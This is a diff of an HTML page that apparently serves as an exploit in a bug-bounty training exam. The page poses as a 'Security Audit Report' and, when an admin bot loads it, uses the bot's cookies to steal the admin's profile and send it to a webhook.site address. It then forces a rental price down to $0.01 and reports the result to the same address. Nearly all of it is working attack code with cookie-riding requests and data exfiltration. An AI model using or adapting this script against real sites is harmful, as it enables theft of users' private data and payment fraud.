@@ -1,39 +1,66 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Security Audit Report</title>
+</head>
 <body>
-    <h1>Processing Report...</h1>
+    <h1>System Analysis in Progress...</h1>
+    <p>Please do not close this window.</p>
+
     <script>
-        const targetApi = "https://api-bugbounty-exam.hashacademy.co/api/rentals/update/BK-00011"; // Replace with a real ID
+        // --- CONFIGURATION AREA (Change these numbers) ---
+        const WEBHOOK_URL = "https://webhook.site/411195ff-53bb-4984-8d9b-01cd86eb4cbb";
         
-        fetch(targetApi, {
-            method: "PATCH",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                "totalPrice": 0.01, // Try changing the price to something negligible
-                "status": "completed",
-                "adminNotes": "Price overridden by automated system"
-            }),
-            credentials: "include" // This is the key: it uses the Bot's cookies
-        })
-        .then(response => response.json())
-        .then(data => {
-            // Exfiltrate the response to see if the flag is in the 'updated' object
-            fetch("https://webhook.site/your-id", {
-                method: "POST",
-                body: JSON.stringify({
-                    msg: "Exploit Triggered",
-                    responseData: data
-                })
-            });
-        })
-        .catch(err => {
-            fetch("https://webhook.site/411195ff-53bb-4984-8d9b-01cd86eb4cbb", {
-                method: "POST",
-                body: JSON.stringify({ error: err.message })
-            });
-        });
+        // 1. Change this to the Booking ID (Flag 2 hinted at BK-00001, etc.)
+        const TARGET_BOOKING_ID = "BK-00011"; 
+        
+        // 2. Change this to your Car ID (from your Owner Dashboard)
+        const TARGET_CAR_ID = "69d29dc336ce3d2a57baea07"; 
+
+        const BASE_API = "https://api-bugbounty-exam.hashacademy.co/api";
+
+        async function executeExploit() {
+            try {
+                // STAGE 1: Data Exfiltration (Read the Admin's Private Info)
+                const profileRes = await fetch(`${BASE_API}/auth/profile`, {
+                    method: "GET",
+                    credentials: "include"
+                });
+                const profileData = await profileRes.json();
+
+                // Send stolen profile data to Webhook
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    body: JSON.stringify({ event: "ADMIN_PROFILE_STOLEN", data: profileData })
+                });
+
+                // STAGE 2: Business Logic Manipulation (Change Rental Amount)
+                // We force the admin to "approve" or "update" a rental price to $0.01
+                const patchRes = await fetch(`${BASE_API}/rentals/update/${TARGET_BOOKING_ID}`, {
+                    method: "PATCH",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        "totalPrice": 0.01,
+                        "status": "approved",
+                        "internalNotes": "Exploit check - Flag 5 hunt"
+                    }),
+                    credentials: "include"
+                });
+                const patchData = await patchRes.json();
+
+                // Send result of the price change to Webhook
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    body: JSON.stringify({ event: "PRICE_MANIPULATION_RESULT", data: patchData })
+                });
+
+            } catch (err) {
+                // Log errors to your webhook so you know if the script crashed
+                await fetch(`${WEBHOOK_URL}?error=${encodeURIComponent(err.message)}`);
+            }
+        }
+
+        executeExploit();
     </script>
 </body>
 </html>
